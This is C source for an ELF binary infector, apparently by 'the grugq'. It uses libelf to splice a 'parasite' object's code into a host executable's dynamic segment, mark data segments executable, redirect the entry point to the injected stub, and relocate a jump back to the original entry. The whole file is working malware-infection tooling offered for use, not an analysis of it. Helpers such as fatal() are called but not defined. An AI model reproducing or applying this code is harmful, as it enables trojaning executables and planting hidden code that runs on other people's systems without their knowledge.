/*
 * Copyright (C) 2001 the grugq.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by the grugq.
 * 4. The name the grugq may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <libelf/libelf.h>

int dump_dynamic(Elf *elf);
Elf_Scn * get_scnbyname(Elf *elf, char *name, int *num);

struct reloc {
	Elf32_Rel	* r_rel; // relocation array
	int		  r_cnt; // number of relocations
	Elf32_Sym	* r_sym; // Symbol table
	char		* r_buf; // buffer being modifed
	Elf_Scn		* r_scn; // scn of the buffer being modifed
	char		* r_strs;// string table 

};
typedef struct reloc Reloc;

long	Segment_Inc;
long	Orig_Entry;
char *	my_name;
int	verbose;


Reloc *
new_reloc(Elf *elf)
{
	Reloc		* ret;
	Elf_Data	* data;
	Elf_Scn		* scn;

	if ((ret = malloc(sizeof(Reloc))) == NULL)
		return NULL;
	memset(ret, 0x00, sizeof(Reloc));


	/* the reloc scn points to the scn being modified,
	 * the reloc buf points to the data being modified
	 * the reloc rel points to the reloc entries
	 * the reloc sym points to the symbol table
	 */

	if ((scn = get_scnbyname(elf, ".rel.text", NULL)) == NULL)
		return NULL;

	if ((data = elf_getdata(scn, NULL)) == NULL)
		return NULL;

	ret->r_rel = (Elf32_Rel *)data->d_buf;
	ret->r_cnt = data->d_size / sizeof(Elf32_Rel);
	/* finding relocations complete */

	if ((scn = get_scnbyname(elf, ".text", NULL)) == NULL)
		return NULL;
	if ((data = elf_getdata(scn, NULL)) == NULL)
		return NULL;

	ret->r_buf = data->d_buf;
	ret->r_scn = scn;
	/* finding .text complete */

	if ((scn = get_scnbyname(elf, ".symtab", NULL)) == NULL)
		return NULL;
	if ((data = elf_getdata(scn, NULL)) == NULL)
		return NULL;

	ret->r_sym = (Elf32_Sym *)data->d_buf;
	/* finding symbols complete */

	if ((scn = get_scnbyname(elf, ".strtab", NULL)) == NULL)
		return NULL;
	if ((data = elf_getdata(scn, NULL)) == NULL)
		return NULL;

	ret->r_strs = data->d_buf;
	/* string table found and complete */

	return ret;
}

int
relocate_text(Elf *elf)
{
	Reloc		* rel;
	Elf32_Rel	* r;
	Elf32_Sym	* sym;
	int		  i;


	if ((rel = new_reloc(elf)) == NULL)
		return (-1);

	for (i=0, r = rel->r_rel; i < rel->r_cnt; i++, r++) {
		long	  append;
		long	* disp;

		switch (ELF32_R_TYPE(r->r_info)) {
		case R_386_PC32:
			sym = &rel->r_sym[ELF32_R_SYM(r->r_info)];

			append = rel->r_buf[r->r_offset];
			disp = (long *)(rel->r_buf + r->r_offset);

			*disp = (long)((append + sym->st_value) - r->r_offset);
			printf("Fixing:\n");
			printf("\toff_t %#.04x\n", r->r_offset);
			printf("\tsym  %s\n", rel->r_strs + sym->st_name);
			printf("\tdisp %#.04x\n", *disp);
			break;

		// This would be a R_SPARC_UA64 for the sparc v9
		case R_386_32:
			sym = &rel->r_sym[ELF32_R_SYM(r->r_info)];
			disp = (long *)(rel->r_buf + r->r_offset);

			if (strcmp("entry", rel->r_strs + sym->st_name) == 0) {
				printf("Relocating 'entry' to: %#0x\n",
						Orig_Entry);
				*disp = Orig_Entry;
			}
			else
				printf("Unknown reloc: %s\n", rel->r_strs + 
						sym->st_name);
			break;
		default:
			printf("Skipping...\n");
			break;
		}
	}
	return 0;
}


static int
insert_buf(Elf *elf, Elf_Data *para)
{
	Elf_Scn		* scn;
	Elf_Data	* data;
	int		  i;

	if ((scn = get_scnbyname(elf, ".dynamic", &i)) == NULL)
		return (-1);
	if ((data = elf_newdata(scn)) == NULL)
		return (-1);

	// memcpy(data, para, sizeof (Elf_Data));

	data->d_buf     = para->d_buf;
	data->d_size    = para->d_size;

	Segment_Inc += para->d_size;

	return 0;
}

int
insert_text(Elf *host, Elf *para)
{
	Elf_Scn	 * scn;
	Elf_Data * data;

	if ((scn = get_scnbyname(para, ".text", NULL)) == NULL)
		return (-1);
	if ((data = elf_getdata(scn, NULL)) == NULL) 
		return (-1);

	return (insert_buf(host, data));
}

int
update_entry(Elf *elf)
{
	Elf32_Ehdr	* ehdr;
	Elf32_Phdr	* phdr;
	int		  i;

	if ((ehdr = elf32_getehdr(elf)) == NULL)
		return (-1);
	if ((phdr = elf32_getphdr(elf)) == NULL)
		return (-1);

	for (i=0; i < ehdr->e_phnum; i++, phdr++)
		if (phdr->p_type == PT_DYNAMIC)
			break;

	if (phdr->p_type != PT_DYNAMIC)
		return (-1);

	Orig_Entry = ehdr->e_entry;
	ehdr->e_entry = phdr->p_vaddr + phdr->p_filesz;

	return 0;
}

#define IFF_INC(p,i) if (p) { p += i; }
int
update_segments(Elf *elf)
{
	Elf32_Phdr	* phdr;
	Elf32_Ehdr	* ehdr;
	int		  i,
			  f = 0;

	if ((ehdr = elf32_getehdr(elf)) == NULL)
		return (-1);
	if ((phdr = elf32_getphdr(elf)) == NULL)
		return (-1);

	for (i = 0; i < ehdr->e_phnum; i++, phdr++) {
		/* find the .data segment header */
		switch (phdr->p_type) {
		case PT_LOAD:
			if (!(phdr->p_flags&PF_W))
				break;
			/* FALL THRU */
		case PT_DYNAMIC:
			phdr->p_flags |= PF_X;
			phdr->p_filesz += Segment_Inc;
			phdr->p_memsz += Segment_Inc;
			f++;
			break;
		default:
			if (f) {
				IFF_INC(phdr->p_offset, Segment_Inc);
				IFF_INC(phdr->p_vaddr, Segment_Inc);
				IFF_INC(phdr->p_paddr, Segment_Inc);
			}
			break;
		}
	}
	return 0;
}

int
usage(void)
{
	printf( "%s <fpv> [host file] [parasite]\n"
		"-f host file\n"
		"-p parasite file\n"
		"-v verbose\n"
		, my_name
		);
	exit(EXIT_FAILURE);
}

int
main (int argc, char **argv)
{
	Elf	* host,
		* para;
	int	  h_fd,
		  p_fd,
		  c;
	char	* h_file = NULL,
		* p_file = NULL;
	
	my_name = strrchr(argv[0], '/');
	if (my_name[0] == '/')
		my_name++;

	while ((c = getopt(argc, argv, "f:p:v")) != EOF) {
		switch (c) {
		case 'f':
			h_file = optarg;
			break;
		case 'p':
			p_file = optarg;
			break;
		case 'v':
			verbose++;
			break;
		default:
			usage();
		}
	}

	argc -= optind;
	argv += optind;

	if (argc) {
		if (argc == 2) {
			h_file = argv[0];
			p_file = argv[1];
		}
		else
			usage();
	}

	if ((h_fd = open(h_file, O_RDWR, 0)) <0) {
		perror("Opening host file");
		exit(EXIT_FAILURE);
	}

	if ((p_fd = open(p_file, O_RDWR, 0)) <0) {
		perror("Opening host file");
		exit(EXIT_FAILURE);
	}

	elf_version(EV_CURRENT);

	if ((host = elf_begin(h_fd, ELF_C_RDWR, NULL)) == NULL)
		fatal("Elf_begin");

	if ((para = elf_begin(p_fd, ELF_C_RDWR, NULL)) == NULL)
		fatal("Elf_begin");

	/* update ehdr->e_entry to point to the stub */
	if (update_entry(host) < 0)
		fatal("update_entry");

	/* relocate calls to dl_lib, etc */
	if (relocate_text(para) < 0)
		fatal("relocate_text()");

	/* insert the .text from parasite into the host */
	if (insert_text(host, para) < 0)
		fatal("insert_text()");

	/* All finished, just fix up the program headers */
	if (update_segments(host) < 0)
		fatal("update_segment()");

	elf_flagelf(host, ELF_C_SET, ELF_F_DIRTY);
	if (elf_update(host, ELF_C_WRITE) < 0)
		fatal("elf_update()");

	if (verbose)
		dump_dynamic(host);

	return 0;
}
